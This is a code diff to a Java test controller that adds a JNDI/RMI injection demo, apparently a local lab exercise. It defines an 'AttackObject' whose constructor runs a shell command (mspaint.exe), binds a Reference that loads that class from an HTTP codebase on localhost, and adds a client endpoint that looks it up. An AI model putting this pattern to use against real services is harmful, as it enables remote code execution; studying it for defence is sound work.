@@ -1,10 +1,12 @@
 package cn.moonlord.test;
 
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import io.swagger.annotations.*;
 import org.slf4j.*;
 import org.springframework.web.bind.annotation.*;
 
-import java.io.Serializable;
+import javax.naming.Reference;
+import java.io.*;
 import java.rmi.*;
 import java.rmi.registry.*;
 import java.rmi.server.UnicastRemoteObject;
@@ -49,17 +51,26 @@ public class JNDITestController {
         }
     }
 
+    public static class AttackObject implements Serializable {
+        public AttackObject() throws Exception {
+            Runtime.getRuntime().exec("mspaint.exe");
+        }
+    }
+
     @ApiOperation(value="测试用例 A1，启动 RMI 服务端")
     @GetMapping(value = "/TestA1")
     @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "listenPort", example = "9000")})
     public String TestA1(@RequestParam Integer registryPort) throws Exception {
         RemoteTask remoteTask = new RemoteTask();
-        UnicastRemoteObject.exportObject(remoteTask, registryPort);
+        UnicastRemoteObject.exportObject(remoteTask, 0);
         LocalTask localTask = new LocalTask();
+        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/AttackObject.class");
+        ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
         Registry registry = LocateRegistry.createRegistry(registryPort);
         logger.info("registry : " + registry);
         registry.bind("remoteTask", remoteTask);
         registry.bind("localTask", localTask);
+        registry.bind("attackObject", attackObjectWrapper);
         Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask", remoteTask);
         Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/localTask", localTask);
         for(String name : registry.list()){
@@ -126,6 +137,22 @@ public class JNDITestController {
             logger.info("registry name : " + name);
         }
         Task task = (Task) Naming.lookup("rmi://127.0.0.1:" + registryPort + "/naming/localTask");
+        logger.info("task : " + task);
+        Message message = new Message("Hello World");
+        logger.info("message : " + message + " " + message.message);
+        return task.execute(message).toString();
+    }
+
+    @ApiOperation(value="测试用例 A6，启动 RMI 客户端，Naming.lookup 调用远程方法，在服务器上执行")
+    @GetMapping(value = "/TestA6")
+    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
+    public String TestA6(@RequestParam Integer registryPort) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
+        logger.info("registry : " + registry);
+        for(String name : registry.list()){
+            logger.info("registry name : " + name);
+        }
+        Task task = (Task) registry.lookup("attackObject");
         logger.info("task : " + task);
         Message message = new Message("Hello World");
         logger.info("message : " + message + " " + message.message);
